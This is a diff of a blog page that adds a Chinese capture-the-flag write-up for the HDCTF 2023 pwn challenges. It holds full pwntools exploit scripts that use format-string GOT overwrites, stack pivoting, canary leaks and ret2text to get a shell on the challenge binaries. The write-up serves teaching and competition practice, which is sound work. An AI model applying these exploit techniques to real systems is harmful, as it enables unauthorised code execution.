@@ -378,21 +378,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-24
+                    2023-04-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    6 分
                 </div>
                 
 
@@ -416,10 +416,261 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>[TOC]</p>
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c">
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwnner"><a href="#pwnner" class="headerlink" title="pwnner"></a>pwnner</h2><ul>
+<li>rand伪随机数</li>
+<li>ret2text</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwnner"</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28272</span><span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwnner"</span><span class="token punctuation">)</span>
+
+dll <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+dll<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x39</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"name:\n"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>dll<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>dll<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x40</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4008B6</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'next?\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
+
+<h2 id="KEEP-ON"><a href="#KEEP-ON" class="headerlink" title="KEEP ON"></a>KEEP ON</h2><ul>
+<li>格式化字符串漏洞</li>
+<li>栈迁移</li>
+</ul>
+<p>可以看到存在格式化字符串漏洞，且第二个read存在栈溢出，但是只能溢出到ret_addr，所以考虑栈迁移。且程序存在system函数，我们把/bin/sh写入栈上，然后调用system</p>
+<p><img src="/2023/04/24/hdctf2023-wp/0.png"></p>
+<p><img src="/2023/04/24/hdctf2023-wp/1.png"></p>
+<p>利用思路1：</p>
+<ul>
+<li>通过格式化字符串泄漏出rbp的值，然后计算出s-8的地址</li>
+<li>然后栈迁移到s-8的位置</li>
+</ul>
+<blockquote>
+<p>注意/bin/sh\x00要用\x00截断</p>
+</blockquote>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./hdctf'</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hdctf"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./hdctf"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+pop_rdi <span class="token operator">=</span> <span class="token number">0x00000000004008d3</span> <span class="token comment">#pop rdi ; ret</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x00000000004007f2</span> <span class="token comment">#leave ; ret</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'%16$p'</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name: \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'hello,'</span><span class="token punctuation">)</span>
+rbp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+target <span class="token operator">=</span> rbp <span class="token operator">-</span> <span class="token number">0x60</span> <span class="token operator">-</span> <span class="token number">0x8</span>
+binsh <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token number">0x20</span>
+payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span>
+payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'on !\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>利用思路2：<strong>注意这里返回地址要返回到_start处，不然打不通，因为你如果直接返回到main函数的话，则没有进行一些初始化操作，可能导致偏移发生变化</strong></p>
+<ul>
+<li>利用格式化字符串把printf_got修改为system_plt</li>
+<li>然后再返回vuln，输入/bin/sh\x00即可</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./hdctf'</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+<span class="token comment">#io = process("./hdctf")</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28931</span><span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./hdctf"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name: \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+<span class="token comment">#要返回到_start函数哦！！！</span>
+payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'on !\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name: \n'</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="Makewish"><a href="#Makewish" class="headerlink" title="Makewish"></a>Makewish</h2><p>跟nkctf2023的baby_rop思路一样，只是这个题存在后门函数，所以不用自己泄漏libc了</p>
+<ul>
+<li>利用第一个read覆盖canary的低字节为非0，然后puts(buf)就可以泄漏canary了</li>
+<li>rand伪随机数绕过就不说了</li>
+<li>vuln函数中存在off by null 漏洞，可以覆盖rbp的低字节为0</li>
+<li>调用完vuln后有leave;ret指令，所以这里可以栈迁移，这里会迁移到rbp中的地址处(此时rbp中的地址低字节已经被覆盖为0了)</li>
+<li>所以我们可以把buf里面写满system后门函数的地址，这样只要能够有一次迁移到buf里面就可以getshell了(看运气啦&gt;_&lt;)</li>
+</ul>
+<p><img src="/2023/04/24/hdctf2023-wp/2.png"></p>
+<p><img src="/2023/04/24/hdctf2023-wp/3.png"></p>
+<p><img src="/2023/04/24/hdctf2023-wp/4.png"></p>
+<p><img src="/2023/04/24/hdctf2023-wp/5.png"></p>
+<p>exp：<strong>注意key用p32哦，因为v4是int，四字节哦</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+<span class="token comment">#io = process("./pwn")</span>
+
+dll <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+
+key <span class="token operator">=</span> dll<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1000</span> <span class="token operator">+</span> <span class="token number">324</span>
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+        <span class="token comment">#覆盖canary低字节为0，从而泄漏canary</span>
+        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"name\n\n"</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x29</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'hello,\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x29</span><span class="token punctuation">)</span>
+        <span class="token comment">#print(io.recv())</span>
+        canary <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
+        canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>canary<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b"key\n\n"</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#p32 p32 不然远程打不通</span>
+        <span class="token comment">#gdb.attach(io)</span>
+        <span class="token comment">#pause()</span>
+        <span class="token comment">#把buf填满system = 0x4004CB的地址</span>
+        payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4007CB</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">11</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'me\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="Minions"><a href="#Minions" class="headerlink" title="Minions"></a>Minions</h2><p>与KEEP ON类似：</p>
+<p>exp1：直接修改printf的got表项为system_plt</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./minions1'</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./minions1"</span><span class="token punctuation">)</span>
+<span class="token comment">#io = remote("node1.anna.nssctf.cn", 28259)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./minions1"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+key <span class="token operator">=</span> <span class="token number">0x00000000006010A0</span>
+
+ret_payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token comment">#修改key</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>key<span class="token punctuation">:</span><span class="token number">102</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name?\n\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'about you\n'</span><span class="token punctuation">,</span> ret_payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Minions?\n'</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span>
+<span class="token comment">#修改printf的got表项</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name?\n\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'about you\n'</span><span class="token punctuation">,</span> ret_payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Minions?\n'</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span>
+<span class="token comment">#get shell</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name?\n\n'</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp2：栈迁移，这里直接迁移到栈上，虽然可以迁移到bss段但是好像有点问题，exp3讲</p>
+<p><strong>注意：这里泄漏的栈地址是在vuln函数里面泄漏的，而我们读入的payload是在main的栈帧里面，所以不要算成了vuln里面的buf位置，所以这里自己得动手动调算一下偏移</strong>，你直接跟到vuln刚好结束，这时的栈帧就是main的栈帧</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./minions1'</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+<span class="token comment">#io = process("./minions1")</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28236</span><span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./minions1"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+key <span class="token operator">=</span> <span class="token number">0x00000000006010A0</span>
+
+ret_payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>key<span class="token punctuation">:</span><span class="token number">102</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name?\n\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'about you\n'</span><span class="token punctuation">,</span> ret_payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Minions?\n'</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'A%32$p'</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name?\n\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token punctuation">)</span>
+
+stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x30</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400893</span> <span class="token comment"># pop rdi ; ret</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000400758</span> <span class="token comment"># leave ; ret</span>
+binsh <span class="token operator">=</span> <span class="token number">0x00000000006010C0</span>
+
+payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stack<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'about you\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Minions?\n'</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>exp3：官方预期解（暂时没搞懂，copy个exp吧）</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./minions1'</span><span class="token punctuation">)</span>
+key<span class="token operator">=</span><span class="token number">0x6010A0</span>
+payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>key<span class="token punctuation">:</span> <span class="token number">0x66</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"welcome,tell me more about you"</span><span class="token punctuation">)</span>
+leave_addr <span class="token operator">=</span> <span class="token number">0x0000000000400758</span>
+bss_addr <span class="token operator">=</span> <span class="token number">0x6010C0</span>
+<span class="token comment">#gdb.attach(p)</span>
+payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token comment">#pause()</span>
+rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400893</span>
+system_addr <span class="token operator">=</span> <span class="token number">0x400763</span>
+ret_addr<span class="token operator">=</span><span class="token number">0x0000000000400581</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"That's great.Do you like Minions?"</span><span class="token punctuation">)</span>
+read_addr <span class="token operator">=</span> <span class="token number">0x4005E0</span>
+rsi_r15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400891</span>
+payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_r15_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010e8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_r15_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601110</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601110</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+ payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_r15_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601110</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601110</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
+ p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010c0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="RE（待复现）"><a href="#RE（待复现）" class="headerlink" title="RE（待复现）"></a>RE（待复现）</h1>
                 
             </div>
             <hr/>
@@ -788,7 +1039,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">55.5k</span>
+                        class="white-color">56.8k</span>
             
             
             
